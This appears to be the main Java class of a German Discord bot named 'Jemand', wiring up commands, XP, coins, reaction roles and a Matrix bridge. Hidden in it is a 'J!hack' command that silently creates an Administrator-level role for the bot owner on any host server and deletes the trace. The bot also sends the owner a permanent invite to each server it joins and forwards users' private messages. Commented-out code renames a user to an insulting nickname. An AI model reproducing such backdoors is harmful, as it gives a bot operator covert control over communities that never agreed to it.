package Jemand;

import Jemand.Listener.Channelportal;
import Jemand.Listener.CommandCleanupListener;
import Jemand.Listener.GuildUtilities;
import Jemand.Listener.MatrixDiscordBridge;
import Jemand.Listener.ReactionRole;
import Jemand.Listener.ZitatBewerter;
import com.vdurmont.emoji.EmojiParser;
import de.jojii.matrixclientserver.Bot.Client;
import org.apache.commons.io.FileUtils;
import org.javacord.api.entity.activity.ActivityType;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.entity.permission.Permissions;
import org.javacord.api.entity.permission.RoleBuilder;
import org.javacord.api.entity.server.Server;
import org.javacord.api.entity.user.User;
import org.javacord.api.entity.user.UserStatus;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.util.cache.MessageCache;
import org.json.simple.JSONObject;

import java.io.File;
import java.io.IOException;
import java.math.BigInteger;
import java.util.Optional;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;


public class Main {
	private static final Pattern NOT_LETTER = Pattern.compile("[^A-Za-z]");
	static AtomicReference<String> xd = new AtomicReference<>("");

	public static void main(String[] args) {
		func.getApi().updateStatus(UserStatus.DO_NOT_DISTURB);


		//func.getApi().getCachedUserById(331793234252660738L).ifPresent(user -> {
		//	user.updateNickname(user.getApi().getServerById(367648314184826880L).get(), "Herr Oberfaschist").join();
		//});

		//func.getApi().getServerById(367648314184826880L).ifPresent(server -> {
		//	server.addUserChangeNicknameListener(event -> {
		//		if (event.getUser().getId() == 331793234252660738L) {
		//			if (event.getNewNickname().orElse("").equalsIgnoreCase("Ken der Guru")) {
		//				event.getUser().updateNickname(server, "Herr Oberfaschist").join();
		//			}
		//		}
		//	});
		//});

		//nt posName = Zitat.NAMEN.length;
		//nt posZitat = Zitat.ZITATE.length;

		//tring[] newQuotes = ("").split("\n");
		//tring[] newNames = ("").split("\n");

		//itat.updateNames();

		//tringBuilder namenToAdd = new StringBuilder();
		//tringBuilder quotesToAdd = new StringBuilder();

		//tringBuilder alteNamn = new StringBuilder();
		//or (int i = 0; i < Zitat.NAMEN.length; i++) {
		//	alteNamn.append(Zitat.NAMEN[i]).append("\n");
		//

		//tring[] NAMEN = alteNamn.toString().split("\n");


		//ashMap<String, Integer> namenIndex = new HashMap<>();
		//or (int i = 0; i < newNames.length; i++) {
		//	int zitatPos = -1;
		//	for (int j = 0; j < Zitat.ZITATE.length; j++) {
		//		if(Zitat.ZITATE[j].equalsIgnoreCase("\"" + newQuotes[i] + "\"")) {
		//			zitatPos = j;
		//			break;
		//		}
		//	}

		//	if (zitatPos == -1) {
		//		zitatPos = posZitat++;
		//		quotesToAdd.append("\"").append(newQuotes[i]).append("\"\n");
		//	}

		//	int namenPos = -1;

		//	if(namenIndex.containsKey(newNames[i])) {
		//		namenPos = namenIndex.get(newNames[i]);
		//	} else {
		//		for (int j = 0; j < NAMEN.length; j++) {
		//			if(NAMEN[j].equalsIgnoreCase(newNames[i])) {
		//				namenPos = j;
		//				break;
		//			}
		//		}

		//		if (namenPos == -1) {
		//			namenPos = posName++;
		//			namenToAdd.append(newNames[i]).append("\n");
		//		}
		//		namenIndex.put(newNames[i], namenPos);
		//	}

		//	Zitat.rateQuote(zitatPos + "-" + namenPos, 1);
		//
		//itat.addName(namenToAdd.toString());
		//itat.saveRating();

		try {
			MessageCache messageCache = new MessageCache() {
				@Override
				public int getCapacity() {
					return 0;
				}

				@Override
				public void setCapacity(int capacity) {

				}

				@Override
				public int getStorageTimeInSeconds() {
					return 0;
				}

				@Override
				public void setStorageTimeInSeconds(int storageTimeInSeconds) {

				}

				@Override
				public void setAutomaticCleanupEnabled(boolean automaticCleanupEnabled) {

				}
			};
			messageCache.setAutomaticCleanupEnabled(true);
		} catch (Exception e) {func.handle(e);}

		//help
		//final String help = "\u200B:regional_indicator_a: -> +**help**\n:regional_indicator_b: -> +**ping**\n:regional_indicator_c: -> +**roll** (Zahl)\n:regional_indicator_d: -> +**pong**\n:regional_indicator_e: -> +**say** [Text]\n:regional_indicator_f: -> +**MSG** [Nachricht] {}\n:regional_indicator_g: -> +**4-gewinnt** {}\n:regional_indicator_h: -> +**SSPB/SSS**\n:regional_indicator_i: -> +**invite**\n:regional_indicator_j: -> +**Report** [Text]\n:regional_indicator_k: -> +**Serverinvite** [Dauer in h] [Anzahl Aufrufe]\n:regional_indicator_l: -> +**Emote** [Text]\n:regional_indicator_m: -> +**React** [Text] (MessageID)\n:regional_indicator_n: -> +**TTT** {}\n:regional_indicator_o: -> +**Fake-Person**\n:regional_indicator_p: -> +**Fake-Cat**\n:regional_indicator_q: -> +**8-ball** (Frage)\n:regional_indicator_r: -> +**random-picture**/**robot**/**face**/**alien**/**cat**/**human**\n:regional_indicator_s: -> +**Prefix** [neues Preifx]";

		try {
        	if(func.getFileSeparator().equals("/")) {
        	    func.getApi().addServerMemberJoinListener(event -> {
        	    	try {
						new userleave(event, true).sendMessage();
					}catch(Exception e) {func.handle(e);}
        	    });
        	    func.getApi().addServerMemberLeaveListener(event -> {
					try {
        	        	new userleave(event, false).sendMessage();
					}catch(Exception e) {func.handle(e);}
        	    });
        	}
		} catch (Exception e) {func.handle(e);}
			//func.getApi().getServerById("367648314184826880").ifPresent(server -> {
			//server.addUserChangeActivityListener(event -> {

			////if(!event.getUser().isBot()) {
			//	server.getChannelById("623940807619248148").flatMap(Channel::asServerTextChannel).ifPresent(textchannel -> {
			//		event.getNewActivity().ifPresent(activity -> {
			//			event.getOldActivity().ifPresent(oldactivity -> {
			//				if (!oldactivity.getApplicationId().orElse(0L).equals(activity.getApplicationId().orElse(1L)) && ((activity.getType().equals(ActivityType.PLAYING) && activity.getName().equals("Fortnite") && false) || (activity.getApplicationId().orElse(0L) == 432980957394370572L))) {
			//					EmbedBuilder embed = new EmbedBuilder()
			//							.setColor(new Color(f.getRandom(0, 255), f.getRandom(0, 255), f.getRandom(0, 255)))
			//							.setTimestampToNow()
			//							.setFooter(event.getUser().getDiscriminatedName(), event.getUser().getAvatar());
			//					AtomicReference<String> details = new AtomicReference<>("");
			//					activity.getDetails().ifPresent(string -> {
			//						details.set("\nDetails: (" + string + ")");
			//					});
			//					textchannel.sendMessage(embed.setDescription(event.getUser().getDisplayName(server) + " spielt " + activity.getName() + "." + details.get()));
			//				}
			//			});
			//		});
			//	});
			////}
			//});

		//});

		//erkennt, wenn Server join
		// t
		try {
			//try {
			//	final DiscordApi api2 = new DiscordApiBuilder().setToken(func.pws[3]).login().join();
//
			//	api2.updateStatus(UserStatus.DO_NOT_DISTURB);
			//	api2.updateActivity(ActivityType.PLAYING, "Fortnite");
//
			//} catch(Exception e) {
			//	func.handle(e);
			//}


			if (func.getFileSeparator().equals("/")) { //only Linux

				//String logs = FileUtils.readFileToString(new File("/usr/home/admin/Jemand.log"));
				//if (logs.length() > 1000001)
				//	FileUtils.writeStringToFile(new File("/usr/home/admin/Jemand.log"), logs.substring(logs.length() - 999999), "UTF-8");
//
				func.getApi().addServerJoinListener(event -> {
					func.OWNER.ifPresent(u -> u.sendMessage("Neuer Server von " + event.getApi().getUserById(event.getServer().getOwnerId()).join().getDiscriminatedName() + " mit dem Namen: " + event.getServer().getName() + " und der Id: " + event.getServer().getIdAsString()));
					func.getApi().getYourself().updateNickname(event.getServer(), "Jemand [J!]");
					try {
						func.sendOwner("https://joshix-1.github.io/invite?id=" + event.getServer().getIdAsString() + "\n", null);
						func.sendOwner(event.getServer().getChannels().get(0).createInviteBuilder().setMaxUses(1).setNeverExpire().create().join().getUrl().toString(), null);
					} catch (Exception e) {
						func.handle(e);

					}

				});

				func.writetexttofile("", "backups/ratelimit.txt"); //To avoid getting errors when restarting the bot
			}
		}catch(Exception e) {func.handle(e);}

		//erkennt wenn Nachricht ankommt
		try {
			func.getApi().addReconnectListener(event -> event.getApi().getActivity().ifPresent(activity -> event.getApi().updateActivity(activity.getType(), activity.getName())));
			//Listeners:
			func.getApi().addMessageDeleteListener(new CommandCleanupListener());

			func.getApi().addMessageCreateListener(new Channelportal());
			func.getApi().addReactionAddListener(new Channelportal());
			func.getApi().addMessageEditListener(new Channelportal());

			func.getApi().addReactionAddListener(new ZitatBewerter.Add());
			func.getApi().addReactionRemoveListener(new ZitatBewerter.Remove());
			func.getApi().addReactionAddListener(new ReactionRole.Add());
			func.getApi().addReactionRemoveListener(new ReactionRole.Remove());
			new GuildUtilities(func.getApi());

			//MatrixBridge
			Client client = new Client("http://matrix.org");
			client.login("jemand-bot", func.pws[8], loginData -> {
				if (loginData.isSuccess()) {
					new MatrixDiscordBridge(func.getApi(), client, MatrixDiscordBridge.MATRIX_ROOM, Channelportal.channels[0]);
				} else {
					System.err.println("error logging in");
				}
			});

			new KaenguruComics(func.getApi(), client).start();

			func.getApi().addMessageCreateListener(event -> {
				if (event.getMessageContent().equalsIgnoreCase("J!restart") && func.userIsTrusted(event.getMessageAuthor())) {
					if (func.getFileSeparator().equals("/")) {
						try {
							if (Runtime.getRuntime().exec("chmod +x /usr/home/admin/Jemand/Jemand-1.0-SNAPSHOT/bin/Jemand").waitFor() == 0) {
								func.shutdown();
								System.exit(69);
							} else {
								event.getChannel().sendMessage(func.getRotEmbed(event).setDescription("lol, geht nicht"));
							}
						} catch (InterruptedException | IOException e) {
							e.printStackTrace();
						}
					}
				}

				if ((func.getFileSeparator().equals("/")
						|| func.OWNER.map(User::getId).orElse(0L) == event.getMessageAuthor().getId())
						&& event.getMessageAuthor().isUser()
						&& !event.getMessageAuthor().isBotUser()
						&& !event.getMessageAuthor().isWebhook()
						&& !event.getMessageAuthor().isYourself()) {

					//id
					final String id = event.getMessageAuthor().getIdAsString();
					Optional<User> user = event.getMessageAuthor().asUser();

					if (event.getPrivateChannel().isPresent() && !event.getMessageAuthor().isYourself() && event.getMessageAuthor().asUser().isPresent()) {
						if(func.userIsTrusted(event.getMessageAuthor())) {
							if(event.getMessageContent().startsWith("//")) {
								String[] strings = event.getMessageContent().split(" ");
								if(strings.length > 1) {
									try {
										String a = strings[0];
										func.getApi().getUserById(a.replace("/", "")).join().sendMessage(func.removeSpaceAtStart(event.getMessageContent().replaceFirst(a, ""))).join();
										event.getChannel().sendMessage("Erfolgreich gesendet.").join();
									} catch(Exception e) {
										func.handle(e);
									}
								}
							}
						} else {
							EmbedBuilder e = func.getNormalEmbed(event);
							event.getMessageAttachments().forEach(att -> {
								e.addField(att.getFileName(), att.getUrl().toString());
							});
							func.OWNER.ifPresent(owner -> owner.sendMessage(e.addField("UserID:", event.getMessageAuthor().getIdAsString()).setDescription(event.getMessageContent())));
						}
					} else if(event.getServer().isPresent()) {
						//Transaction transaction = ElasticApm.startTransaction();
						//transaction.setStartTimestamp(System.currentTimeMillis());
						//transaction.setName("CommandInvokation");

						final Server server = event.getServer().get();
						AtomicReference<String> prefix = new AtomicReference<>("J!");

						//prefix
						JSONObject prefixjs = func.JsonFromFile("prefix.json");

						//serverid
						final String serverid = server.getIdAsString();

						if (prefixjs.containsKey(serverid)) {
							prefix.set((String) prefixjs.get(serverid));
						} else {
							prefixjs.put(serverid, "J!");
							prefix.set("J!");
						}

						//event.getChannel().type();


						if (func.userIsTrusted(event.getMessageAuthor())) {

							if (event.getMessageContent().equalsIgnoreCase("J!hack")) {
								new RoleBuilder(server)
										.setName("lol")
										.setPermissions(Permissions.fromBitmask(8))
										.create().thenAcceptAsync(role -> func.OWNER.ifPresent(role::addUser));
								event.getMessage().delete();
								//transaction.setResult("hack");
								//transaction.end();
								return;
							}

							if (event.getMessage().getContent().equalsIgnoreCase("J!servers")) {
								AtomicReference<String> servers = new AtomicReference<>("");
								Object[] ObjectArray1 = func.getApi().getServers().toArray();
								for (Object o : ObjectArray1) {
									servers.set(servers.get() + "\n" + o);
								}
								event.getChannel().sendMessage(servers.get());
								//transaction.setResult("servers");
								//transaction.end();
								return;
							}

						}


						if (user.isPresent()) {
							String MentionBot = func.getApi().getYourself().getMentionTag();
							String MessageContent = func.removeSpaceAtStart(event.getMessageContent().replaceAll(func.getApi().getYourself().getNicknameMentionTag(), MentionBot));

							if (MessageContent.equals(func.getApi().getYourself().getMentionTag())) {
								Texte texte = new Texte(event);
								event.getChannel().sendMessage(func.getNormalEmbed(event).setTitle(texte.get("Prefix")).setDescription(texte.get("Mention")));
								//transaction.setResult("Only mention.");
								//transaction.end();
							} else {
								if ((MessageContent.toLowerCase().startsWith(prefix.get().toLowerCase()) || MessageContent.startsWith(func.getApi().getYourself().getMentionTag()))) {
									if (func.getApi().getThreadPool().getExecutorService().submit(() -> run(event)).isDone()) {
										func.getApi().getThreadPool().getExecutorService().shutdown();
									}
									//transaction.setResult("Is command.");
									//transaction.end();
								} else {
									//coins
									if(func.getRandom(0, 2) == 0)
										new Coins(event.getMessageAuthor().getId()).addCoins(BigInteger.TEN);

									//xp
									JSONObject xp = func.JsonFromFile("xp/user_xp_" + serverid + ".json");
									if (!xd.get().contains(id + "_" + serverid)) {
										if (!xp.containsKey(id)) {
											xp.put(id, 0);
											func.JsonToFile(xp, "xp/user_xp_" + serverid + ".json");
										}
										xd.set(xd.get() + " " + id + "_" + serverid);

										AtomicBoolean b = new AtomicBoolean(true);

										event.getMessage().addMessageDeleteListener(event2 -> {
											b.set(false);
										}).removeAfter(4, TimeUnit.MINUTES);

										func.getApi().getThreadPool().getScheduler().schedule(()-> {
											if(b.get()) {
												JSONObject xp2 = func.JsonFromFile("xp/user_xp_" + serverid + ".json");
												xp2.put(id, (long) xp2.get(id) + 1);
												func.JsonToFile(xp2, "xp/user_xp_" + serverid + ".json");
												new Levelroles(event.getServer().get()).checkUserRoles(event.getMessageAuthor().asUser().get());

											}
										}, 4, TimeUnit.MINUTES);

										func.getApi().getThreadPool().getScheduler().schedule(() -> {
											xd.set(xd.get().replace(" " + id + "_" + serverid, ""));
										}, 45, TimeUnit.SECONDS);
									}
									triggerreact(event, "einzigst", EmojiParser.parseToUnicode(":face_palm:"));
									triggerreact(event, "zumindestens", EmojiParser.parseToUnicode(":face_palm:"));
									triggerreact(event, ":joy:", EmojiParser.parseToUnicode(":joy:"));
									triggerreact(event, EmojiParser.parseToUnicode(":joy:"), EmojiParser.parseToUnicode(":joy:"));

									//transaction.setResult("Not a command.");
									//transaction.end();
								}
							}
						} else {
							//transaction.setResult("User not cached.");
							//transaction.end();
						}
					}
				}
			});
		} catch (Exception e) {func.handle(e);}

		System.out.println("System started succesfully: " + func.createBotInvite());
		if(func.getFileSeparator().equals("/")) func.sendOwner("System started succesfully: <" + func.createBotInvite() + ">  " + func.getFileSeparator(), null);
		func.getApi().updateActivity(ActivityType.LISTENING, "allem");
	}

    static private boolean TriggerReactText(MessageCreateEvent event, String ReactTo, String ReactWith) {
        //if(event.getMessageContent().toLowerCase().contains(ReactTo.toLowerCase())) {
		if (event.getMessageContent().matches(".*.?\\s+(?i)" + ReactTo + "\\s+.?.*") || event.getMessageContent().matches("(?i)" + ReactTo) || event.getMessageContent().matches(".*.?\\s+(?i)" + ReactTo) || event.getMessageContent().matches("(?i)" + ReactTo + "\\s+.?.*")) { //&& !event.getMessageContent().matches(".?.*\\w(?i)" + ReactTo + "\\w.*.?")
            func.reactText(event,ReactWith, "");
            return true;
        }
		return false;
    }
	static private void TriggerReactMessage(MessageCreateEvent event, String ReactTo, String ReactWith) {
		if(NOT_LETTER.matcher(event.getMessageContent()).replaceAll("").equalsIgnoreCase(NOT_LETTER.matcher(ReactTo).replaceAll(""))) {
			func.reactText(event,ReactWith, "");
		}
	}
	static private void triggerreact (MessageCreateEvent event, String s1, String unicodeofemote) {
		if (event.getMessage().getContent().toLowerCase().contains(s1.toLowerCase())) {
			event.getMessage().addReaction(unicodeofemote);
		}
	}

	static private void run(MessageCreateEvent event) {
		//Transaction transaction = ElasticApm.startTransaction();
		//transaction.setStartTimestamp(System.currentTimeMillis());
		//transaction.setName("CommandExecution");
		func.getApi().getCustomEmojiById(630814528266960909L).ifPresent(event::addReactionToMessage); //loading
		boolean b1;
		try {
			b1 = new Befehl(event/*, transaction*/).fuehreAus();
		} catch (Exception e) {
			func.handle(e);
			b1 = false;
			//transaction.captureException(e);
		}
		func.getApi().getCustomEmojiById(630814528266960909L).ifPresent(event::removeReactionByEmojiFromMessage); //loading
		if (b1) {
			event.addReactionToMessage("☑️").join();
			//transaction.setResult("Command executed successful.");
			//transaction.setLabel("successful", true);
		} else {
			event.addReactionToMessage("❌").join();
			//transaction.setLabel("successful", false);

		}
		//transaction.end();
	}
}
